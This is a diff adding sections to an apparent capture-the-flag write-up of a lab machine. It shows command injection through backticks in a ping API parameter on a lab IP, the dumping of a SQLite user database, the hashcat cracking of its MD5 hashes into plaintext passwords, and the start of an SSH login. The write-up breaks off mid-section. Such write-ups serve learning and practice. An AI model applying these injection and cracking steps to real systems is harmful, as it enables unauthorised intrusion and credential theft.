@@ -155,10 +155,56 @@ Alvaro Squalo | Sq4l
 })();
 ```
 
+- Im relativly new to api's but by analyzing the code we see that the function getAPIURL returns the domain name of the web host port 8081. Then then function checkAPIStatus goes to the url http://10.10.90.74:8081/ping?ip=10.10.90.74 . Which might be worth looking into before moving forward.
+- After going to that web address, we can see that it returns the ping command. This looks like a form of remote code execution. Returned ping:
+<p><span style="color:green"><em>
+PING 10.10.90.74 (10.10.90.74) 56(84) bytes of data. 64 bytes from 10.10.90.74: icmp_seq=1 ttl=64 time=0.037 ms --- 10.10.90.74 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.037/0.037/0.037/0.000 ms
+</em></p>
+- The first thing I do is try to find out where I am in the system, I do this by running the command pwd
+	- http://10.10.90.74:8081/ping?ip=`pwd`, this is the output:
+<p><span style="color:green"><em>
+ping: /home/www/api: Temporary failure in name resolution 
+</em></p>
+- We can see that our wokring directory is /home/www/api
+- Now we can start looking around and trying to find the database filename. 
+- The next command im going to run is a simple ls
+	- http://10.10.90.74:8081/ping?ip=`ls`, this is the output:
+<p><span style="color:green"><em>
+ping: utech.db.sqlite: Name or service not known 
+</em></p>
+- Great! the name of the database is utech.db.sqlite
 
 ### What is the first user's password hash?
+- To find the first user's password hash I belive we should try to look in the ultratech database file. To do this I will use the same method I did to find the database.
+	- http://10.10.90.74:8081/ping?ip=`cat utech.db.sqlite`
+ <p><span style="color:green"><em>
+ping: ) \ufffd\ufffd\ufffd(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded
+ </em></p>   
+
+From this we can see that the username and password hash.
+
+<p><span style="color:green"><em>
+r00t 	: f357a0c52799563c7c7b76c1e7543a32
+admin	: 0d0ea5111e3c1def594c1684e3b9be84
+</em></p>
 
 ### what is the password associated with this hash?
+
+- To find the hash values, I will use hashcat.
+	- hashcat -m 0 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt
+<p><span style="color:green"><em>
+r00t	: n100906
+admin	: mrsheafy
+</em></p>
+
+## Part 3 - Gathering Intel 
+
+### what are the first 9 characters of the root user's private SSH key?
+
+- The first thing im going to do is log into the ssh server using the user:pass we found in the last section.
+- The admin account doesnt work for the ssh server but it might for the :31331/partners.html login page. It brings us to message from lp1 to please look at the servers configuration files.
+- r00t is able to log into the ssh server.
+-   
 
   
 
